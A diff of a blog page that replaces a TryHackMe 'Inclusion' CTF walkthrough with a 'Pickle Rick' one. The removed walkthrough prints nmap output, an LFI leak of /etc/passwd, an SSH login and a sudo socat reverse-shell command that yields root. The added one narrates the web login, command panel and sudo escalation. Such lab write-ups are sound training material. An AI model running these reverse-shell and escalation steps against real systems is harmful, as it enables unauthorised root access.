@@ -4,7 +4,7 @@
     <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
 
-    <title>Inclusion | CTF write-up</title>
+    <title>Pickle Rick CTF | write-up</title>
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
@@ -17,23 +17,23 @@
     
     <meta property="og:site_name" content="fr33s0ul">
     <meta property="og:type" content="article">
-    <meta property="og:title" content="Inclusion | CTF write-up">
-    <meta property="og:description" content="today's CTF is really easy, and really recommend it for beginners to CTFs, let's go straight to it ENUMERATION!  root@kali:~# nmap -sC -sV 10.10.94.6 Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-10 14:38 UTC Nmap scan report for ip-10-10-94-6.eu-west-1.compute.internal (10.10.">
-    <meta property="og:url" content="https://fr33s0ul.tech/inclusion-ctf-write-up/">
-    <meta property="og:image" content="https://fr33s0ul.tech/content/images/2020/04/cdsczxcasdasdqw-2.png">
-    <meta property="article:published_time" content="2020-04-10T14:45:16.000Z">
-    <meta property="article:modified_time" content="2020-04-11T09:00:38.000Z">
+    <meta property="og:title" content="Pickle Rick CTF | write-up">
+    <meta property="og:description" content="Hello again, today we'll cover another CTF made by Tryhackme.com such a cool box I enjoyed every second of it, I hope you do and let's start our challenge with some enumeration.  nmap -sC -sV &amp;lt;target-machine&amp;gt;it looks like we don't have much to break, two ports.">
+    <meta property="og:url" content="http://localhost:2368/pickle-rick/">
+    <meta property="og:image" content="http://localhost:2368/content/images/2020/04/rick_morty-2.jpg">
+    <meta property="article:published_time" content="2020-04-02T15:41:21.000Z">
+    <meta property="article:modified_time" content="2020-04-10T15:44:54.000Z">
     <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:title" content="Inclusion | CTF write-up">
-    <meta name="twitter:description" content="today's CTF is really easy, and really recommend it for beginners to CTFs, let's go straight to it ENUMERATION!  root@kali:~# nmap -sC -sV 10.10.94.6 Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-10 14:38 UTC Nmap scan report for ip-10-10-94-6.eu-west-1.compute.internal (10.10.">
-    <meta name="twitter:url" content="https://fr33s0ul.tech/inclusion-ctf-write-up/">
-    <meta name="twitter:image" content="https://fr33s0ul.tech/content/images/2020/04/cdsczxcasdasdqw-1.png">
+    <meta name="twitter:title" content="Pickle Rick CTF | write-up">
+    <meta name="twitter:description" content="Hello again, today we'll cover another CTF made by Tryhackme.com such a cool box I enjoyed every second of it, I hope you do and let's start our challenge with some enumeration.  nmap -sC -sV &amp;lt;target-machine&amp;gt;it looks like we don't have much to break, two ports.">
+    <meta name="twitter:url" content="http://localhost:2368/pickle-rick/">
+    <meta name="twitter:image" content="http://localhost:2368/content/images/2020/04/rick_morty-1.jpg">
     <meta name="twitter:label1" content="Written by">
     <meta name="twitter:data1" content="fr33s0ul">
     <meta name="twitter:site" content="@fr33soul_">
     <meta name="twitter:creator" content="@fr33soul_">
-    <meta property="og:image:width" content="1650">
-    <meta property="og:image:height" content="1100">
+    <meta property="og:image:width" content="1000">
+    <meta property="og:image:height" content="714">
     
     <script type="application/ld+json">
 {
@@ -42,12 +42,12 @@
     "publisher": {
         "@type": "Organization",
         "name": "fr33s0ul",
-        "url": "https://fr33s0ul.tech/",
+        "url": "http://localhost:2368/",
         "logo": {
             "@type": "ImageObject",
             "url": {
                 "@type": "ImageObject",
-                "url": "https://fr33s0ul.tech/content/images/2020/03/logo.gif",
+                "url": "http://localhost:2368/content/images/2020/03/logo.gif",
                 "width": 300,
                 "height": 41
             }
@@ -58,29 +58,29 @@
         "name": "fr33s0ul",
         "image": {
             "@type": "ImageObject",
-            "url": "https://fr33s0ul.tech/content/images/2020/03/asdasd.gif",
+            "url": "http://localhost:2368/content/images/2020/03/asdasd.gif",
             "width": 600,
             "height": 594
         },
-        "url": "https://fr33s0ul.tech/author/fr33s0ul/",
+        "url": "http://localhost:2368/author/fr33s0ul/",
         "sameAs": [
             "https://twitter.com/fr33soul_"
         ]
     },
-    "headline": "Inclusion | CTF write-up",
-    "url": "https://fr33s0ul.tech/inclusion-ctf-write-up/",
-    "datePublished": "2020-04-10T14:45:16.000Z",
-    "dateModified": "2020-04-11T09:00:38.000Z",
+    "headline": "Pickle Rick CTF | write-up",
+    "url": "http://localhost:2368/pickle-rick/",
+    "datePublished": "2020-04-02T15:41:21.000Z",
+    "dateModified": "2020-04-10T15:44:54.000Z",
     "image": {
         "@type": "ImageObject",
-        "url": "https://fr33s0ul.tech/content/images/2020/04/cdsczxcasdasdqw.png",
-        "width": 1650,
-        "height": 1100
+        "url": "http://localhost:2368/content/images/2020/04/rick_morty.jpg",
+        "width": 1000,
+        "height": 714
     },
-    "description": "today&#x27;s CTF is really easy, and really recommend it for beginners to CTFs, let&#x27;s\ngo straight to it\n\nENUMERATION!\n\n [https://giphy.com/gifs/hell-yeah-Za2fXikif3b9e]\n\nroot@kali:~# nmap -sC -sV 10.10.94.6\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-04-10 14:38 UTC\nNmap scan report for ip-10-10-94-6.eu-west-1.compute.internal (10.10.94.6)\nHost is up (0.0014s latency).\nNot shown: 998 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; prot",
+    "description": "\n--------------------------------------------------------------------------------\n\nHello again, today we&#x27;ll cover another CTF made by Tryhackme.com such a cool box\nI enjoyed every second of it, I hope you do and let&#x27;s start our challenge with\nsome enumeration.\n\n [https://giphy.com/gifs/rick-pickle-9zXWAIcr6jycE]\n\n&gt; nmap -sC -sV &lt;target-machine&gt;\nit looks like we don&#x27;t have much to break, two ports. 22 for ssh and 80 http, So\nfirst what I usually do is give a quick check to the source code of the ",
     "mainEntityOfPage": {
         "@type": "WebPage",
-        "@id": "https://fr33s0ul.tech/"
+        "@id": "http://localhost:2368/"
     }
 }
     </script>
@@ -117,7 +117,7 @@
     <li class="nav-whoami" role="menuitem"><a href="../whoami/">whoami</a></li>
 </ul>
 
-                    <span class="nav-post-title ">Inclusion | CTF write-up</span>
+                    <span class="nav-post-title ">Pickle Rick CTF | write-up</span>
             </div>
         </div>
     </div>
@@ -126,7 +126,7 @@
                     <a class="social-link social-link-tw" href="https://twitter.com/fr33soul_" title="Twitter" target="_blank" rel="noopener"><svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 32 32"><path d="M30.063 7.313c-.813 1.125-1.75 2.125-2.875 2.938v.75c0 1.563-.188 3.125-.688 4.625a15.088 15.088 0 0 1-2.063 4.438c-.875 1.438-2 2.688-3.25 3.813a15.015 15.015 0 0 1-4.625 2.563c-1.813.688-3.75 1-5.75 1-3.25 0-6.188-.875-8.875-2.625.438.063.875.125 1.375.125 2.688 0 5.063-.875 7.188-2.5-1.25 0-2.375-.375-3.375-1.125s-1.688-1.688-2.063-2.875c.438.063.813.125 1.125.125.5 0 1-.063 1.5-.25-1.313-.25-2.438-.938-3.313-1.938a5.673 5.673 0 0 1-1.313-3.688v-.063c.813.438 1.688.688 2.625.688a5.228 5.228 0 0 1-1.875-2c-.5-.875-.688-1.813-.688-2.75 0-1.063.25-2.063.75-2.938 1.438 1.75 3.188 3.188 5.25 4.25s4.313 1.688 6.688 1.813a5.579 5.579 0 0 1 1.5-5.438c1.125-1.125 2.5-1.688 4.125-1.688s3.063.625 4.188 1.813a11.48 11.48 0 0 0 3.688-1.375c-.438 1.375-1.313 2.438-2.563 3.188 1.125-.125 2.188-.438 3.313-.875z"></path></svg>
 </a>
             </div>
-                <a class="rss-button" href="https://feedly.com/i/subscription/feed/https://fr33s0ul.tech/rss/" title="RSS" target="_blank" rel="noopener"><svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24"><circle cx="6.18" cy="17.82" r="2.18"></circle><path d="M4 4.44v2.83c7.03 0 12.73 5.7 12.73 12.73h2.83c0-8.59-6.97-15.56-15.56-15.56zm0 5.66v2.83c3.9 0 7.07 3.17 7.07 7.07h2.83c0-5.47-4.43-9.9-9.9-9.9z"></path></svg>
+                <a class="rss-button" href="https://feedly.com/i/subscription/feed/http://localhost:2368/rss/" title="RSS" target="_blank" rel="noopener"><svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24"><circle cx="6.18" cy="17.82" r="2.18"></circle><path d="M4 4.44v2.83c7.03 0 12.73 5.7 12.73 12.73h2.83c0-8.59-6.97-15.56-15.56-15.56zm0 5.66v2.83c3.9 0 7.07 3.17 7.07 7.07h2.83c0-5.47-4.43-9.9-9.9-9.9z"></path></svg>
 </a>
 
     </div>
@@ -143,7 +143,7 @@
             <header class="post-full-header">
 
 
-                <h1 class="post-full-title">Inclusion | CTF write-up</h1>
+                <h1 class="post-full-title">Pickle Rick CTF | write-up</h1>
 
 
                 <div class="post-full-byline">
@@ -171,7 +171,7 @@
                         <section class="post-full-byline-meta">
                             <h4 class="author-name"><a href="../author/fr33s0ul/">fr33s0ul</a></h4>
                             <div class="byline-meta-content">
-                                <time class="byline-meta-date" datetime="2020-04-10">10 Apr 2020</time>
+                                <time class="byline-meta-date" datetime="2020-04-02">2 Apr 2020</time>
                                 <span class="byline-reading-time"><span class="bull">•</span> 3 min read</span>
                             </div>
                         </section>
@@ -183,88 +183,17 @@
             </header>
 
             <figure class="post-full-image">
-                <img srcset="../content/images/size/w300/2020/04/cdsczxcasdasdqw.png 300w,
-                           ../content/images/size/w600/2020/04/cdsczxcasdasdqw.png 600w,
-                          ../content/images/size/w1000/2020/04/cdsczxcasdasdqw. png 1000w,
-                         ../content/images/size/w2000/2020/04/cdsczxcasdasdqw. png 2000w" sizes="(max-width: 800px) 400px,
+                <img srcset="../content/images/size/w300/2020/04/rick_morty.jpg 300w,
+                           ../content/images/size/w600/2020/04/rick_morty.jpg 600w,
+                          ../content/images/size/w1000/2020/04/rick_morty.jpg 1000w,
+                         ../content/images/size/w2000/2020/04/rick_morty.jpg 2000w" sizes="(max-width: 800px) 400px,
                         (max-width: 1170px) 1170px,
-                            2000px" src="../content/images/size/w2000/2020/04/cdsczxcasdasdqw.png" alt="Inclusion | CTF write-up">
+                            2000px" src="../content/images/size/w2000/2020/04/rick_morty.jpg" alt="Pickle Rick CTF | write-up">
             </figure>
 
             <section class="post-full-content">
                 <div class="post-content">
-                    <p>today's CTF is really easy, and really recommend it for beginners to CTFs, let's go straight to it</p><p><strong>ENUMERATION!</strong></p><!--kg-card-begin: html--><iframe src="https://giphy.com/embed/Za2fXikif3b9e" width="451" height="480" frameborder="0" class="giphy-embed" allowfullscreen></iframe><p><a href="https://giphy.com/gifs/hell-yeah-Za2fXikif3b9e"></a></p><!--kg-card-end: html--><pre><code>root@kali:~# nmap -sC -sV 10.10.94.6
-Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-10 14:38 UTC
-Nmap scan report for ip-10-10-94-6.eu-west-1.compute.internal (10.10.94.6)
-Host is up (0.0014s latency).
-Not shown: 998 closed ports
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   2048 e6:3a:2e:37:2b:35:fb:47:ca:90:30:d2:14:1c:6c:50 (RSA)
-|   256 73:1d:17:93:80:31:4f:8a:d5:71:cb:ba:70:63:38:04 (ECDSA)
-|_  256 d3:52:31:e8:78:1b:a6:84:db:9b:23:86:f0:1f:31:2a (ED25519)
-80/tcp open  http    Werkzeug httpd 0.16.0 (Python 3.6.9)
-|_http-title: My blog
-MAC Address: 02:13:CE:65:8B:84 (Unknown)
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 7.02 seconds
-root@kali:~#</code></pre><p>We have two ports open 22 for SSH and 80 for HTTP running under python, which I think running django ... anyways! </p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="../content/images/2020/04/Screenshot-2020-04-10-at-16.00.48.png" class="kg-image"><figcaption>ow look at that LFI-attack!</figcaption></figure><figure class="kg-card kg-image-card kg-card-hascaption"><img src="../content/images/2020/04/Screenshot-2020-04-10-at-15.40.22.png" class="kg-image"><figcaption>ok</figcaption></figure><p>and we have the /etc/passwd and a clear password for our user down there ...</p><pre><code>root@kali:~# ssh falconfeast@10.10.94.6
-The authenticity of host '10.10.94.6 (10.10.94.6)' can't be established.
-ECDSA key fingerprint is SHA256:VRi7CZbTMsqjwnWmH2UVPWrLVIZzG4BQ9J6X+tVsuEQ.
-Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-Warning: Permanently added '10.10.94.6' (ECDSA) to the list of known hosts.
-falconfeast@10.10.94.6's password: 
-Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-74-generic x86_64)
-
- * Documentation:  https://help.ubuntu.com
- * Management:     https://landscape.canonical.com
- * Support:        https://ubuntu.com/advantage
-
-  System information as of Fri Apr 10 20:13:54 IST 2020
-
-  System load:  0.42              Processes:           87
-  Usage of /:   34.9% of 9.78GB   Users logged in:     0
-  Memory usage: 32%               IP address for eth0: 10.10.94.6
-  Swap usage:   0%
-
-
- * Canonical Livepatch is available for installation.
-   - Reduce system reboots and improve kernel security. Activate at:
-     https://ubuntu.com/livepatch
-
-3 packages can be updated.
-3 updates are security updates.
-
-
-Last login: Thu Jan 23 18:41:39 2020 from 192.168.1.107
-falconfeast@inclusion:~$ sudo -l
-Matching Defaults entries for falconfeast on inclusion:
-    env_reset, mail_badpass,
-    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
-
-User falconfeast may run the following commands on inclusion:
-    (root) NOPASSWD: /usr/bin/socat
-falconfeast@inclusion:~$</code></pre><p>we are user falconfeast ! and we have a NOPASSWD SUDO FOR SOCAT .... speaking of socat, there's a PoC in <strong>GTFObins</strong>, I really recommend checking the website it does have a lot of good knowledge.</p><figure class="kg-card kg-image-card"><img src="../content/images/2020/04/Screenshot-2020-04-10-at-15.46.56.png" class="kg-image"></figure><pre><code>root@kali:~# socat file:`tty`,raw,echo=0 tcp-listen:5151
-</code></pre><pre><code>falconfeast@inclusion:~$ sudo -l
-Matching Defaults entries for falconfeast on inclusion:
-    env_reset, mail_badpass,
-    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
-
-User falconfeast may run the following commands on inclusion:
-    (root) NOPASSWD: /usr/bin/socat
-falconfeast@inclusion:~$ RHOST=10.10.95.247
-falconfeast@inclusion:~$ RPORT=5151
-falconfeast@inclusion:~$ sudo /usr/bin/socat tcp-connect:$RHOST:$RPORT exec:sh,pty,stderr,setsid,sigint,sane
-
-</code></pre><pre><code>root@kali:~# socat file:`tty`,raw,echo=0 tcp-listen:5151
-sh: 0: can't access tty; job control turned off                                     
-# id                                                                                
-uid=0(root) gid=0(root) groups=0(root)
-# 
-</code></pre><p>and that's it here, go get your flags! </p><!--kg-card-begin: html--><iframe src="https://giphy.com/embed/qyIKyAdelGPYI" width="480" height="305" frameborder="0" class="giphy-embed" allowfullscreen></iframe><p><a href="https://giphy.com/gifs/this-is-our-youth-qyIKyAdelGPYI"></a></p><!--kg-card-end: html--><p>Happy Hacking!</p>
+                    <hr><p>Hello again, today we'll cover another CTF made by Tryhackme.com such a cool box I enjoyed every second of it, I hope you do and let's start our challenge with some enumeration.</p><!--kg-card-begin: html--><iframe src="https://giphy.com/embed/9zXWAIcr6jycE" width="480" height="338" frameborder="0" class="giphy-embed" allowfullscreen></iframe><p><a href="https://giphy.com/gifs/rick-pickle-9zXWAIcr6jycE"></a></p><!--kg-card-end: html--><blockquote>nmap -sC -sV <strong>&lt;target-machine&gt;</strong></blockquote><figure class="kg-card kg-image-card"><img src="../content/images/2020/04/Screenshot-2020-04-02-at-16.50.12-1.png" class="kg-image"></figure><figure class="kg-card kg-image-card"><img src="../content/images/2020/04/Screenshot-2020-04-02-at-17.02.37.png" class="kg-image"></figure><p>it looks like we don't have much to break, two ports. 22 for ssh and 80 http, So first what I usually do is give a quick check to the source code of the site in case something is hidden there, and after we have an idea about what we are dealing with, let's check for some directories</p><figure class="kg-card kg-image-card"><img src="../content/images/2020/04/Screenshot-2020-04-02-at-17.02.49-1.png" class="kg-image"></figure><figure class="kg-card kg-image-card"><img src="../content/images/2020/04/Screenshot-2020-04-02-at-17.06.28.png" class="kg-image"></figure><figure class="kg-card kg-image-card"><img src="../content/images/2020/04/Screenshot-2020-04-02-at-17.14.10.png" class="kg-image"></figure><p>That is such a weird robots.txt file! it may be something useful for us, so we will keep it aside and it is weird that we have a username without login panel let's nikto the hell of this box</p><figure class="kg-card kg-image-card"><img src="../content/images/2020/04/Screenshot-2020-04-02-at-17.06.35.png" class="kg-image"></figure><figure class="kg-card kg-image-card"><img src="../content/images/2020/04/Screenshot-2020-04-02-at-17.07.01.png" class="kg-image"></figure><figure class="kg-card kg-image-card"><img src="../content/images/2020/04/Screenshot-2020-04-02-at-17.15.21.png" class="kg-image"></figure><p>after finding the login page first what I tried was the famous quote from Rick Wabbalubbadubdub!!!! and we got a command panel that connects us as the user www-data</p><!--kg-card-begin: html--><iframe src="https://giphy.com/embed/l41lI4bYmcsPJX9Go" width="480" height="270" frameborder="0" class="giphy-embed" allowfullscreen></iframe><p><a href="https://giphy.com/gifs/rickandmorty-adult-swim-rick-and-morty-l41lI4bYmcsPJX9Go"></a></p><!--kg-card-end: html--><figure class="kg-card kg-image-card"><img src="../content/images/2020/04/Screenshot-2020-04-02-at-17.16.51.png" class="kg-image"></figure><p>so when we <strong>ls -la </strong>we notice that there are two files Sup3rwhatever.txt and clue.txt let's try and open them in the browser.</p><figure class="kg-card kg-image-card"><img src="../content/images/2020/04/Screenshot-2020-04-02-at-17.31.44.png" class="kg-image"></figure><figure class="kg-card kg-image-card"><img src="../content/images/2020/04/Screenshot-2020-04-02-at-17.32.22.png" class="kg-image"></figure><p>the first file is our first <strong>flag</strong>, the second file tells us to look around the system, for my case I tried to get a reverse shell because that command prompt wasn't satisfying, well guess what every time you'll get a reverse one it will shutdown no matter how much you'll try so don't dig hard in that rabbit hole, and the second thing the command panel we have filters the queries and if one of them is <strong>cat</strong>, <strong>head</strong>, <strong>tail</strong>, whatever ... it won't work, lucky us we still have access to <strong>find </strong>and<strong> less </strong>that's all we need 🙃 after digging in directories with ls -la /stuff/that/linux/have. </p><figure class="kg-card kg-image-card"><img src="../content/images/2020/04/Screenshot-2020-04-02-at-17.59.31.png" class="kg-image"></figure><p>here we go we have the second ingredients for rick, later when I was trying many commands to find files and try to use any process to access the root directory, I thought about the first thing I try to priv escalate which is <strong>sudo -l</strong> and yep we had it all in front of our eyes</p><figure class="kg-card kg-image-card"><img src="../content/images/2020/04/Screenshot-2020-04-02-at-18.03.26.png" class="kg-image"></figure><figure class="kg-card kg-image-card"><img src="../content/images/2020/04/Screenshot-2020-04-02-at-18.03.47.png" class="kg-image"></figure><p>and that's it you are root and you have the third file that contains the last flag for the machine and everything is done the headaches are gone, but to be honest, it is a very cute challenge not hard at all, little bit of twists, but that's the beauty of it you better get used to it.</p><p>Happy hacking!</p>
                 </div>
             </section>
 
@@ -281,23 +210,23 @@ uid=0(root) gid=0(root) groups=0(root)
 
                 <article class="post-card post ">
 
-    <a class="post-card-image-link" href="../blueprint-tryhackme-write-up/">
-        <img class="post-card-image" srcset="../content/images/size/w300/2020/04/blueprint.jpg 300w,
-                   ../content/images/size/w600/2020/04/blueprint.jpg 600w,
-                  ../content/images/size/w1000/2020/04/blueprint.jpg 1000w,
-                 ../content/images/size/w2000/2020/04/blueprint.jpg 2000w" sizes="(max-width: 1000px) 400px, 700px" loading="lazy" src="../content/images/size/w600/2020/04/blueprint.jpg" alt="BluePrint TryHackMe | write-up">
+    <a class="post-card-image-link" href="../ghostcat-write-up/">
+        <img class="post-card-image" srcset="../content/images/size/w300/2020/04/HJI.png 300w,
+                   ../content/images/size/w600/2020/04/HJI.png 600w,
+                  ../content/images/size/w1000/2020/04/HJI. png 1000w,
+                 ../content/images/size/w2000/2020/04/HJI. png 2000w" sizes="(max-width: 1000px) 400px, 700px" loading="lazy" src="../content/images/size/w600/2020/04/HJI.png" alt="Retro | write-up">
     </a>
 
     <div class="post-card-content">
 
-        <a class="post-card-content-link" href="../blueprint-tryhackme-write-up/">
+        <a class="post-card-content-link" href="../ghostcat-write-up/">
 
             <header class="post-card-header">
-                <h2 class="post-card-title">BluePrint TryHackMe | write-up</h2>
+                <h2 class="post-card-title">Retro | write-up</h2>
             </header>
 
             <section class="post-card-excerpt">
-                    <p>Hello everyone, today's is really fun rated as easy, and we get no hints or instruction, only one question as a note: 	 "Do you have what is takes to hack</p>
+                    <p>Hello everyone, today's CTF is provided by tryhackme.com and made by Darkstar7471 it is a web server based on windows, before we start enumerating the machine we have to</p>
             </section>
 
         </a>
@@ -317,7 +246,7 @@ uid=0(root) gid=0(root) groups=0(root)
             </ul>
             <div class="post-card-byline-content">
                 <span><a href="../author/fr33s0ul/">fr33s0ul</a></span>
-                <span class="post-card-byline-date"><time datetime="2020-04-11">11 Apr 2020</time> <span class="bull">•</span> 5 min read</span>
+                <span class="post-card-byline-date"><time datetime="2020-04-03">3 Apr 2020</time> <span class="bull">•</span> 4 min read</span>
             </div>
         </footer>
 
@@ -327,23 +256,23 @@ uid=0(root) gid=0(root) groups=0(root)
 
                 <article class="post-card post ">
 
-    <a class="post-card-image-link" href="../ctfcollectionvol2-write-up/">
-        <img class="post-card-image" srcset="../content/images/size/w300/2020/04/holida-1.png 300w,
-                   ../content/images/size/w600/2020/04/holida-1.png 600w,
-                  ../content/images/size/w1000/2020/04/holida-1. png 1000w,
-                 ../content/images/size/w2000/2020/04/holida-1. png 2000w" sizes="(max-width: 1000px) 400px, 700px" loading="lazy" src="../content/images/size/w600/2020/04/holida-1.png" alt="CTFcollectionVol2 | write-up">
+    <a class="post-card-image-link" href="../cherryblossom-ctf-write-up/">
+        <img class="post-card-image" srcset="../content/images/size/w300/2020/04/cherryCTF-1.png 300w,
+                   ../content/images/size/w600/2020/04/cherryCTF-1.png 600w,
+                  ../content/images/size/w1000/2020/04/cherryCTF-1. png 1000w,
+                 ../content/images/size/w2000/2020/04/cherryCTF-1. png 2000w" sizes="(max-width: 1000px) 400px, 700px" loading="lazy" src="../content/images/size/w600/2020/04/cherryCTF-1.png" alt="CherryBlossom CTF | write-up">
     </a>
 
     <div class="post-card-content">
 
-        <a class="post-card-content-link" href="../ctfcollectionvol2-write-up/">
+        <a class="post-card-content-link" href="../cherryblossom-ctf-write-up/">
 
             <header class="post-card-header">
-                <h2 class="post-card-title">CTFcollectionVol2 | write-up</h2>
+                <h2 class="post-card-title">CherryBlossom CTF | write-up</h2>
             </header>
 
             <section class="post-card-excerpt">
-                    <p>Hello everyone, today's CTF is the second part of a first one, it doesn't mean you need to do the first one to pass to the second. this CTF is</p>
+                    <p>Hello all, this is my first write-up at this page If you see anything not right or have any corrections I would be very happy getting some feedback, anyways let's</p>
             </section>
 
         </a>
@@ -363,7 +292,7 @@ uid=0(root) gid=0(root) groups=0(root)
             </ul>
             <div class="post-card-byline-content">
                 <span><a href="../author/fr33s0ul/">fr33s0ul</a></span>
-                <span class="post-card-byline-date"><time datetime="2020-04-09">9 Apr 2020</time> <span class="bull">•</span> 8 min read</span>
+                <span class="post-card-byline-date"><time datetime="2020-04-01">1 Apr 2020</time> <span class="bull">•</span> 5 min read</span>
             </div>
         </footer>
 
